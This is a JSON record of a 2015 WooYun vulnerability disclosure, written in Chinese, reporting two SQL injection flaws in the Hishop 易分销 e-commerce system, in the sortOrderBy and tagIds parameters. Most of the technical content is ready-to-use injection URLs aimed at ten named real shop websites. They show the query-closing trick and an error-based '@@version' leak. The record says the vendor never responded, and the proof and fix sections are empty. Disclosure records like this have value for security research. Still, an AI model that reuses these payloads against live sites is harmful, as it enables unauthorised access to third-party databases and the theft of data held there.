{"id": 70466, "wybug_id": "wooyun-2015-0135720", "wybug_title": "Hishop易分销系统SQL注入*2", "wybug_corp": "Hishop", "wybug_author": "路人甲", "wybug_date": "2015-08-21 14:48", "wybug_open_date": "2015-10-05 14:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-21：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-10-05：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 关键在于闭合技术 详细说明：  看到 WooYun: hishop易分销系统sql注入一枚  就测试了一下发现了两处SQL  正如前面这位大牛说的，案例实在是多，用户量很大啊。sql 1:/Brand.aspx?pageIndex=1&sortOrderBy=VistiCounts  sortOrderBy参数注入这里要合适的闭合才能够注入，不同的站点可能不同的闭合方法，我就拿5个案例来说事了。\nhttp://eyigo.com/Brand.aspx?pageIndex=1&sortOrderBy=VistiCounts Desc) AS RowNumber FROM vw_Hishop_BrowseProductList p WHERE SaleStatus = 1) T WHERE 1=1 and 1=char(@@version) --http://spt.0351tao.cn/Brand.aspx?pageIndex=1&sortOrderBy=VistiCounts Desc) AS RowNumber FROM vw_Hishop_BrowseProductList p WHERE SaleStatus = 1) T WHERE 1=1 and 1=char(@@version) --http://www.gzkorea.com/Brand.aspx?pageIndex=1&sortOrderBy=VistiCounts Desc) AS RowNumber FROM vw_Hishop_BrowseProductList p WHERE SaleStatus = 1) T WHERE 1=1 and 1=char(@@version) --http://feihongzhixin.mall.hjhl.cn/Brand.aspx?pageIndex=1&sortOrderBy=VistiCounts Desc) AS RowNumber FROM vw_Hishop_BrowseProductList p WHERE SaleStatus = 1) T WHERE 1=1 and 1=char(@@version) --http://www.xdhome.com/Brand.aspx?pageIndex=1&sortOrderBy=VistiCounts Desc) AS RowNumber FROM vw_Hishop_BrowseProductList p WHERE SaleStatus = 1) T WHERE 1=1 and 1=char(@@version) --\n\n\nsql2：/ProductUnSales.aspx?keywords=wooyun&tagIds=1_2&pageIndex=1  tagIds参数注入继续拿几个案例说事：\nhttp://qmhy.com.cn/ProductUnSales.aspx?keywords=wooyun%27&tagIds=1_2)) T WHERE 1=1 and 1=(select char(@@version)) -- &pageIndex=1http://spt.0351tao.cn/ProductUnSales.aspx?keywords=wooyun%27&tagIds=1_2)) T WHERE 1=1 and 1=(select char(@@version)) -- &pageIndex=1http://yuntoys.cn/ProductUnSales.aspx?keywords=wooyun%27&tagIds=1_2)) T WHERE 1=1 and 1=(select char(@@version)) -- &pageIndex=1http://5upf.com/ProductUnSales.aspx?keywords=wooyun%27&tagIds=1_2)) T WHERE 1=1 and 1=(select char(@@version)) -- &pageIndex=1http://www.miegs.com/ProductUnSales.aspx?keywords=wooyun%27&tagIds=1_2)) T WHERE 1=1 and 1=(select char(@@version)) -- &pageIndex=1\n\n\n   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}